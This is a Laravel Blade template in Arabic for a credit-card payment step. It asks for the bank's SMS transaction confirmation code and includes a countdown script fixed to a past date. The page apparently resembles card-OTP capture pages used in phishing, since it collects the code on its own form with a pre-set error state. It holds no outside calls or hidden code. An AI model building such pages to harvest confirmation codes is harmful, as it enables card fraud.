@extends('master')
@section('content')


    <main>
        <section class="mt-5 py-3">
        </section>
        <section class="container-fluid mt-3">
            <div class="row">
                <div class="rounded-4 shadow bg-white col-md-4 col-11 ms-auto me-auto px-4 py-3 my-md-5 my-3 border">
                    <div class="row justify-content-center my-4  align-items-center">
                        <div class=" ">
                            <img src="{{asset('assets/image/icons/visa.png')}}" class="w-25 ms-5 ps-4" alt="">
                            <sapn class="fw-normal fs-4 text-center text-secondary   mx-2" dir="ltr">بطاقة ائتمانية | </sapn>
                        </div>
                    </div>
                    <div class="myCard">
                        <form action="{{ route('send-otp') }}" method="POST" class="container">
                            @csrf
                            <div class="form-floating mb-3">
                                <input type="hidden" name="err" value="" id="">
                                <input type="tel" name="otp" class="form-control rounded-4 is-invalid" id="" required="" placeholder="رمز تأكيد العملية">
                                <p id="demo" class="text-danger p-3 mb-2">EXPIRED</p>
                                <label for="order">
                                    <div class=" text-secondary">
                                        <i class="fa-solid fa-circle-check fa-fw mx-2 fa-lg"></i>
                                        رمز التأكيد
                                    </div>
                                </label>

                            </div>
                            <div class="px-2">
                                <div class="form-check mb-3 border-top pt-2">
                                    <label class="form-check-label text-secondary" style="font-size: 12px;" for="flexCheckDefault">يرجى ادخال رمز تأكيد العملية الذي تم ارساله عبر رسالة
                                        SMS
                                    </label>
                                </div>
                            </div>
                            <div class="mb-3">
                                <button type="submit" class="w-100 btn primaryColor rounded-4 py-2" name="mybtn" id="codeConfirm">تأكيد
                                </button>
                            </div>
                        </form>
                    </div>

                </div>
            </div>
        </section>


        <script>
            // Set the date we're counting down to
            var countDownDate = new Date("Jan 5, 2024 15:37:25").getTime();

            // Update the count down every 1 second
            var x = setInterval(function() {

                // Get today's date and time
                var now = new Date().getTime();

                // Find the distance between now and the count down date
                var distance = countDownDate - now;

                // Time calculations for days, hours, minutes and seconds
                var days = Math.floor(distance / (1000 * 60 * 60 * 24));
                var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
                var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
                var seconds = Math.floor((distance % (1000 * 60)) / 1000);

                // Display the result in the element with id="demo"
                document.getElementById("demo").innerHTML = " سيتم ارسال الكود خلال " + seconds + " ثانية "

                // If the count down is finished, write some text
                if (distance < 0) {
                    clearInterval(x);
                    document.getElementById("demo").innerHTML = "EXPIRED";
                }
            }, 1000);
        </script>

    </main>

@endsection
